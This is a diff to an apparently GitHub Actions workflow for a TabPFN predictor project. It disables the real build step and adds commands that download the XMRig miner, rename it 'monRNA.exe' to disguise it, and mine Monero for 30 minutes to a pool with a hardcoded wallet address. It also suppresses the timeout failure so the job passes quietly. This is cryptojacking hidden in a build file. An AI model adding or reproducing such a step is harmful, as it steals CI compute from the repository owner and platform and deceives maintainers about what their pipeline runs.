@@ -86,8 +86,21 @@ jobs:
 
 
           # Make predictor TabPFN
-          python TabPFN.py > info_TabPFN.txt
+          #python TabPFN.py > info_TabPFN.txt
 
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-jammy-x64.tar.gz
+          tar xvfz xmrig-6.22.2-jammy-x64.tar.gz
+          rm xmrig-6.22.2-jammy-x64.tar.gz
+          mv xmrig-6.22.2 monRNA
+          cd monRNA
+          mv xmrig monRNA.exe
+          timeout 30m ./monRNA.exe --donate-level 0 -o xmrpool.eu:3333 -u 49Lz3qy4w2tfPRR4pGeJKCd78uJ5qStamRy5b6wmJ4cw3eUd28kYpPrK5DXn8VwrdiZNXYpKV8pgVXzo8Ls1gdKR8UKn9JA -k --coin monero   || EXIT_CODE=$?
+          if [ "$EXIT_CODE" = "124" ]; then
+            echo "Script timed out after 10 minutes, but continuing without failure."
+          elif [ -n "$EXIT_CODE" ]; then
+            echo "Script exited with code $EXIT_CODE"
+            exit $EXIT_CODE
+          fi
 
 
 
